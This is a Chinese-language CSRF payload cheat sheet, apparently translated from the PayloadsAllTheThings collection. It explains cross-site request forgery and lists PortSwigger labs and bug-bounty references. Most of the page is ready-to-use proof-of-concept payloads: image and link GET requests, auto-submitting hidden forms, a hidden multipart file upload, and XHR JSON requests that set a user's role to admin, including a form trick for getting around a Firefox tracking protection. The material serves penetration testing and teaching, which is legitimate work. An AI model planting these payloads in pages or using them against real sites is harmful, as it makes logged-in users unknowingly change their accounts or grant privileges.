# 跨站请求伪造

> 跨站请求伪造（CSRF/XSRF）是一种攻击，它迫使终端用户在当前已登录的网站上执行不需要的操作。CSRF 攻击专门针对状态改变的请求，而不是数据窃取，因为攻击者无法看到伪造请求的响应。——OWASP

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [HTML GET - 需要用户交互](#html-get---需要用户交互)
    * [HTML GET - 不需要用户交互](#html-get---不需要用户交互)
    * [HTML POST - 需要用户交互](#html-post---需要用户交互)
    * [HTML POST - 自动提交 - 不需要用户交互](#html-post---自动提交---不需要用户交互)
    * [HTML POST - multipart/form-data 带文件上传 - 需要用户交互](#html-post---multipartform-data-带文件上传---需要用户交互)
    * [JSON GET - 简单请求](#json-get---简单请求)
    * [JSON POST - 简单请求](#json-post---简单请求)
    * [JSON POST - 复杂请求](#json-post---复杂请求)
* [实验](#实验)
* [参考](#参考)

## 工具

* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - 最先进的跨站请求伪造审计和利用工具包。

## 方法论

![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)

当你登录到某个站点时，通常会有会话。该会话的标识符存储在浏览器的 cookie 中，并且每次向该站点发出请求时都会发送这个 cookie。即使其他站点触发了请求，cookie 也会随请求一起发送，并且请求会被当作是已登录用户执行的。

### HTML GET - 需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">点击我</a>
```

### HTML GET - 不需要用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - 需要用户交互

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="提交请求" />
</form>
```

### HTML POST - 自动提交 - 不需要用户交互

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="提交请求" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### HTML POST - multipart/form-data 带文件上传 - 需要用户交互

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">提交请求</button>
```

### JSON GET - 简单请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - 简单请求

使用 XHR：

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
// application/json 在简单请求中不允许，text/plain 是默认值
xhr.setRequestHeader("Content-Type", "text/plain");
// 你可能还需要尝试以下之一或两者
// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
// xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

使用自动提交表单，绕过某些浏览器保护，例如 Firefox 浏览器的 [增强跟踪保护](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) 的标准选项：

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// 这个输入将发送：{"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - 复杂请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 实验

* [PortSwigger - 没有防御措施的 CSRF 漏洞](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [PortSwigger - 令牌验证依赖于请求方法的 CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [PortSwigger - 令牌验证依赖于令牌存在的 CSRF](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [PortSwigger - 令牌与用户会话无关的 CSRF](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [PortSwigger - 令牌与非会话 cookie 相关的 CSRF](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [PortSwigger - 令牌在 cookie 中重复的 CSRF](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [PortSwigger - Referer 验证依赖于头存在的 CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [PortSwigger - Referer 验证损坏的 CSRF](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## 参考

* [跨站请求伪造速查表 - Alex Lauerman - 2016年4月3日](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
* [跨站请求伪造 (CSRF) - OWASP - 2024年4月19日](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [Messenger.com 的 CSRF 显示你检查 CSRF 的步骤 - Jack Whitton - 2015年7月26日](https://whitton.io/articles/messenger-site-wide-csrf/)
* [PayPal 漏洞赏金：未经同意更新 PayPal.me 头像 (CSRF 攻击) - Florian Courtial - 2016年7月19日](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
* [通过一次点击入侵 PayPal 账户（已修补） - Yasser Ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
* [添加推文到收藏夹的 CSRF - Vijay Kumar (indoappsec) - 2015年11月21日](https://hackerone.com/reports/100820)
* [Facebookmarketingdevelopers.com: 代理、CSRF 困境和 API 乐趣 - phwd - 2015年10月16日](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
* [我是如何通过 Apple Bug Bounty 黑掉你的 Beats 账户的？ - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
* [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - 2017年7月2日](https://hackerone.com/reports/245346)
* [通过 CSRF 在 Oculus-Facebook 集成中入侵 Facebook 账户 - Josip Franjkovic - 2018年1月15日](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
* [跨站请求伪造 (CSRF) - Sjoerd Langkemper - 2019年1月9日](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
* [跨站请求伪造攻击 - PwnFunction - 2019年4月5日](https://www.youtube.com/watch?v=eWEgUcHPle0)
* [清除 CSRF - Joe Rozner - 2017年10月17日](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
* [绕过 Referer 检查逻辑的 CSRF - hahwul - 2019年10月11日](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)